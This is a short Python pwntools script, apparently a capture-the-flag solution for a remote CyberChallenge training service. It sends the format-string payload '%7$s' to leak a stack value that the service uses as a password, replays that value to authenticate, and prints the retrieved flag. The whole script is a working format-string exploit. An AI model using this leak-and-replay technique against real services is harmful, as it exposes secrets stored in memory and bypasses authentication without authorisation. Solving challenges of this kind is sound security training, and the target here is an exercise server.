from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9102

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

conn.recvuntil(b":")
conn.sendline(b"%7$s")

conn.recvuntil(b", ")
value = conn.recvline(keepends=False)
print(value.decode())

conn.recvuntil(b":")
conn.sendline(value)

if(b"Invalid password!" in conn.recvline()):
    conn.close()
    print("ERROR")
else:
    conn.recvuntil(b"flag: ")
    flag = conn.recvline(keepends=False).decode()
    conn.close()
    print(flag)